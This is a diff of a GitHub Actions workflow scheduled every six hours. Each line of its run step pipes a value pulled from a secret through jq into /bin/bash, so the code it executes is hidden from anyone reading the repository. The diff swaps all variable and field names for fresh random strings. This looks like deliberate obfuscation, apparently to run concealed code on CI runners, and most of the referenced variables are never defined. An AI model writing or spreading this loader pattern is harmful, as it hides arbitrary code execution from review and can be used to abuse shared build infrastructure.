@@ -1,27 +1,31 @@
 name: wuguoduojian
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '13 1/6 * * *'
+    - cron: '43 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: wuguoduojian
         env:
-          dkowv5: ${{ secrets.dkowv5 }}
+          zvzi08968: ${{ secrets.zvzi08968 }}
         run: |
-          echo $dkowv5 | jq -r .xay377 | /bin/bash
-          echo $drg4 | jq -r .txwe60 | /bin/bash
-          echo $gfn01 | jq -r .g597 | /bin/bash
-          echo $zhiat82223 | jq -r .gjopd41042 | /bin/bash
-          echo $i61477 | jq -r .nim3360 | /bin/bash
-          echo $zdb45 | jq -r .gfen7 | /bin/bash
-          echo $lfbht2 | jq -r .d542 | /bin/bash
-          echo $irzul160 | jq -r .nn7803 | /bin/bash
-          echo $xamay0 | jq -r .tw1379 | /bin/bash
-          echo $l43 | jq -r .dmywm0 | /bin/bash
-          echo $wtp02861 | jq -r .d22497 | /bin/bash
-          echo $xuntg69674 | jq -r .xme13 | /bin/bash
+          echo $zvzi08968 | jq -r .b1 | /bin/bash
+          echo $bmpmb03 | jq -r .epssp6981 | /bin/bash
+          echo $lyvwr794 | jq -r .p1308 | /bin/bash
+          echo $uc8669 | jq -r .w6509 | /bin/bash
+          echo $sdo7495 | jq -r .aktg122 | /bin/bash
+          echo $w83 | jq -r .l93047 | /bin/bash
+          echo $nh58863 | jq -r .duzt638 | /bin/bash
+          echo $gdv95235 | jq -r .uqk329 | /bin/bash
+          echo $t3303 | jq -r .tnaa69 | /bin/bash
+          echo $ewu9418 | jq -r .i98605 | /bin/bash
+          echo $guy4409 | jq -r .hud0268 | /bin/bash
+          echo $xm460 | jq -r .nid4532 | /bin/bash
+          echo $emyp85 | jq -r .sgudy97031 | /bin/bash
+          echo $zsb51 | jq -r .dcv6 | /bin/bash
 
